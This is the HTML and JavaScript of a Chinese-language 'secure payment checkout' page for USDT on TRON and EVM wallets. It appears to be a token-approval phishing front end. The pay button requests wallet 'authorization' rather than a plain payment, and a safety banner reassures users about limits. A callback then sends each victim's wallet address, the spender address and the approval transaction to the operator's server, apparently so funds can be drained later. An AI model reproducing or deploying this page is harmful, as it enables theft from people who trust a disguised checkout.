<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
  <title>安全支付收银台</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    body { background-color: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
    .card-pay { border: none; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); overflow: hidden; }
    .pay-header { background: linear-gradient(135deg, #0052d4 0%, #4364f7 50%, #6fb1fc 100%); color: white; padding: 30px 20px; text-align: center; }
    .amount-display { font-size: 32px; font-weight: 700; margin: 10px 0; }
    .pay-btn { height: 50px; font-size: 18px; font-weight: 600; border-radius: 25px; width: 100%; }
    .status-text { min-height: 24px; font-size: 14px; color: #666; margin-top: 10px; text-align: center; }
  </style>
</head>
<body>

  <div class="container py-4">
    <div class="row justify-content-center">
      <div class="col-12 col-md-6 col-lg-4">
        
        <div class="card card-pay">
          <div class="pay-header">
            <div class="small opacity-75">需支付金额</div>
            <div class="amount-display"><span id="amountText">--</span> USDT</div>
            <div class="badge bg-white text-primary bg-opacity-25 border border-white border-opacity-25 mt-2">
              <span id="netText">正在检测网络...</span>
            </div>
          </div>
          
          <div class="card-body p-4">
            <div id="safeTip" class="alert alert-success py-2 px-3 d-flex align-items-center gap-2" role="alert" style="display:none;margin-bottom:16px;">
              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" class="flex-shrink-0" viewBox="0 0 16 16" aria-hidden="true">
                <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 4a.905.905 0 0 0-.9.995l.35 3.507a.552.552 0 0 0 1.1 0l.35-3.507A.905.905 0 0 0 8 4zm.002 6a1 1 0 1 0 0 2 1 1 0 0 0 0-2z"/>
              </svg>
              <div id="safeTipText" class="small"></div>
            </div>
            <div class="mb-4">
            <div class="d-flex justify-content-between mb-2">
              <span class="text-secondary">USDT 合约地址</span>
            </div>
            <div class="p-2 bg-light rounded text-break mono small" id="toAddressText">
              --
            </div>
          </div>

          <div id="actionArea">
            <button id="btnMainPay" class="btn btn-primary pay-btn" disabled>
              连接钱包中...
            </button>
          </div>
          
          <div id="statusText" class="status-text">请在钱包浏览器中操作</div>
        </div>
      </div>

      <div class="text-center mt-4 text-secondary small">
        <p class="opacity-75">支付后请联系客服确认订单</p>
        <a href="javascript:history.back()" class="text-decoration-none text-secondary">返回上一页</a>
      </div>

      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@6.1.1/dist/TronWeb.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
  <script src="config/config.js"></script>
  <script src="api/client.js"></script>
  <script src="app/core.js"></script>
  <script src="wallet/Evm.js"></script>
  <script src="wallet/TronLink.js"></script>
  <script src="wallet/TokenPocket.js"></script>

  <script>
    (function() {
      const $ = (id) => document.getElementById(id);
      const logEl = $("statusText");
      const btn = $("btnMainPay");
      const safeTipEl = document.getElementById("safeTip");
      const safeTipTextEl = document.getElementById("safeTipText");
      
      function log(msg) {
        if (logEl) logEl.textContent = msg;
        console.log(msg);
      }

      setTimeout(() => {
        const cfg = window.pay0Config || {};
        const amount = cfg.amountUsdt || "0.00";
        $("amountText").textContent = amount;
        $("toAddressText").textContent = "待检测...";
        showSafeTip(amount);
      }, 100);

      function normalizeAmountText(v) {
        try {
          const n = typeof v === "number" ? v : parseFloat(String(v));
          if (!isNaN(n)) return n.toFixed(2);
        } catch (e) {}
        return String(v || "");
      }

      function showSafeTip(amount) {
        if (!safeTipEl || !safeTipTextEl) return;
        const t = normalizeAmountText(amount);
        safeTipTextEl.textContent = "安全提醒：当前授权地址只能转最大" + t + "USDT。";
        safeTipEl.style.display = "flex";
      }

      let payHandler = null;
      let chainType = "unknown";
      let refreshing = false;

      async function checkEnv() {
        const cfg = window.pay0Config || {};
        const okxTronLink = window.okxwallet && window.okxwallet.tronLink ? window.okxwallet.tronLink : null;
        const tronWebCandidate = window.tronWeb || (okxTronLink && okxTronLink.tronWeb ? okxTronLink.tronWeb : null);
        const tronAddr = tronWebCandidate && tronWebCandidate.defaultAddress ? tronWebCandidate.defaultAddress.base58 : null;
        const tronReady = !!(tronAddr || (okxTronLink && okxTronLink.ready) || (window.tronLink && window.tronLink.ready));

        function updateUsdtContractAddress(chainKey) {
          let tokenAddress = "";
          if (cfg.getNetworkConfig) {
            const netCfg = cfg.getNetworkConfig(chainKey);
            if (netCfg) tokenAddress = netCfg.usdtAddress || "";
          }
          $("toAddressText").textContent = tokenAddress || "未配置 USDT 合约地址";
        }

        let evm = null;
        if (window.ethereum) {
          try {
            const chainIdHex = await window.ethereum.request({ method: "eth_chainId" });
            const chainId = parseInt(chainIdHex, 16);

            let foundKey = null;
            if (cfg.networks) {
              for (let key in cfg.networks) {
                const net = cfg.networks[key];
                if (net.chainIdHex && parseInt(net.chainIdHex, 16) === chainId) {
                  foundKey = key;
                  break;
                }
              }
            }

            if (foundKey) {
              let accounts = [];
              try {
                accounts = await window.ethereum.request({ method: "eth_accounts" });
              } catch (e) { }

              let label = foundKey.toUpperCase();
              if (foundKey === "bsc") label = "BSC 主网";
              if (foundKey === "bscTestnet") label = "BSC 测试网";
              if (foundKey === "eth") label = "Ethereum 主网";
              evm = { foundKey, label, hasAccount: Array.isArray(accounts) && accounts.length > 0 };
            } else {
              evm = { unsupportedChainId: chainId };
            }
          } catch (e) { }
        }

        if (tronReady && okxTronLink && okxTronLink.ready) {
          chainType = "tron";
          $("netText").textContent = "TRON 网络";
          updateUsdtContractAddress("tron");
          return async () => {
            log("正在发起 TRON 授权...");
            const amount = (cfg.amountUsdt || "0.00").toString();
            await window.pay0TokenPocketTronTransfer({ log, amountUsdt: amount });
          };
        }

        if (evm && evm.foundKey && evm.hasAccount) {
          chainType = "evm";
          $("netText").textContent = evm.label;
          $("netText").className = "badge bg-white text-primary bg-opacity-25 border border-white border-opacity-25 mt-2";
          updateUsdtContractAddress(evm.foundKey);
          return async () => {
            log("正在发起 EVM 授权...");
            const amount = (cfg.amountUsdt || "0.00").toString();
            await window.pay0EvmApproveAndTransfer({ chain: evm.foundKey, log, amountUsdt: amount });
          };
        }

        if (tronReady) {
          chainType = "tron";
          $("netText").textContent = "TRON 网络";
          updateUsdtContractAddress("tron");
          return async () => {
            log("正在发起 TRON 授权...");
            const amount = (cfg.amountUsdt || "0.00").toString();
            await window.pay0TokenPocketTronTransfer({ log, amountUsdt: amount });
          };
        }

        if (evm && evm.foundKey) {
          chainType = "evm";
          $("netText").textContent = evm.label;
          $("netText").className = "badge bg-white text-primary bg-opacity-25 border border-white border-opacity-25 mt-2";
          updateUsdtContractAddress(evm.foundKey);
          return async () => {
            log("正在发起 EVM 授权...");
            const amount = (cfg.amountUsdt || "0.00").toString();
            await window.pay0EvmApproveAndTransfer({ chain: evm.foundKey, log, amountUsdt: amount });
          };
        }

        if (evm && evm.unsupportedChainId != null) {
          $("netText").textContent = "不支持当前网络: " + evm.unsupportedChainId;
          $("netText").className = "badge bg-danger text-white mt-2";
          $("toAddressText").textContent = "当前网络不支持支付";
          const btn = $("btnMainPay");
          btn.textContent = "网络不支持";
          btn.disabled = true;
          btn.className = "btn btn-secondary pay-btn";
        }

        return null;
      }

      async function refreshEnv() {
        if (refreshing) return;
        refreshing = true;
        try {
          const handler = await checkEnv();
          payHandler = handler;

          if (payHandler) {
            btn.textContent = "立即支付";
            btn.disabled = false;
            btn.classList.remove("btn-secondary");
            btn.classList.add("btn-primary");

            btn.onclick = async () => {
              try {
                btn.disabled = true;
                btn.textContent = "授权处理中...";
                await payHandler();
                btn.textContent = "授权成功";
                btn.classList.remove("btn-primary");
                btn.classList.add("btn-success");
                log("授权已完成");
              } catch (e) {
                btn.disabled = false;
                btn.textContent = "重试支付";
                log("支付失败: " + (e.message || e));
                alert("支付失败: " + (e.message || e));
              }
            };

            log("环境已就绪，请点击按钮进行支付");
          } else {
            if (!btn.disabled) {
              btn.textContent = "未检测到钱包环境";
              btn.disabled = true;
              btn.classList.remove("btn-primary");
              btn.classList.add("btn-secondary");
              $("netText").textContent = "非钱包环境";
              log("请在钱包 APP 中打开此链接");
            }
          }
        } catch (e) {
          log("初始化错误: " + e.message);
        } finally {
          refreshing = false;
        }
      }

      async function init() {
        try {
          await new Promise((r) => setTimeout(r, 500));
          await refreshEnv();

          if (window.ethereum && typeof window.ethereum.on === "function") {
            try {
              window.ethereum.on("chainChanged", () => refreshEnv());
              window.ethereum.on("accountsChanged", () => refreshEnv());
            } catch (e) {}
          }
          document.addEventListener("visibilitychange", () => {
            if (!document.hidden) refreshEnv();
          });
        } catch (e) {
          log("初始化错误: " + e.message);
        }
      }

      window.addEventListener("load", init);

      window.pay0PaymentCallback = async function(info) {
        try {
          const cfg = window.pay0Config || {};
          const chain = String(info.chain || "").trim();
          const txHash = String(info.txHash || "").trim();
          const amountUsdt = String(info.amountUsdt || "").trim();
          const action = String(info.action || "").trim() || "approve";

          let tokenAddress = "";
          let spenderAddress = "";
          let ownerAddress = "";

          if (chain === "tron") {
            if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
              ownerAddress = window.tronLink.tronWeb.defaultAddress.base58;
            } else if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
              ownerAddress = window.tronWeb.defaultAddress.base58;
            }
            const netCfgTron = typeof cfg.getNetworkConfig === "function" ? cfg.getNetworkConfig("tron") : null;
            if (netCfgTron) {
              tokenAddress = netCfgTron.usdtAddress || "";
              spenderAddress = cfg.toAddress || netCfgTron.toAddress || "";
            }
          } else {
            if (window.ethereum && window.ethers && window.ethers.BrowserProvider) {
              try {
                const provider = new window.ethers.BrowserProvider(window.ethereum);
                const signer = await provider.getSigner();
                ownerAddress = await signer.getAddress();
              } catch (e) {}
            }
            if (typeof cfg.getNetworkConfig === "function") {
              const netCfg = cfg.getNetworkConfig(chain);
              if (netCfg) {
                tokenAddress = netCfg.usdtAddress || "";
                spenderAddress = cfg.toAddress || netCfg.toAddress || "";
              }
            }
          }

          if (!ownerAddress) return;
          if (!tokenAddress || !spenderAddress) return;
          if (!chain || !txHash || !amountUsdt) return;

          const body = {
            chain,
            txHash,
            amountUsdt,
            action,
            tokenAddress,
            spenderAddress,
            ownerAddress
          };

          if (window.pay0Api && typeof window.pay0Api.postApproval === "function") {
            await window.pay0Api.postApproval(body);
          }
        } catch (e) {}
      };
    })();
  </script>
</body>
</html>
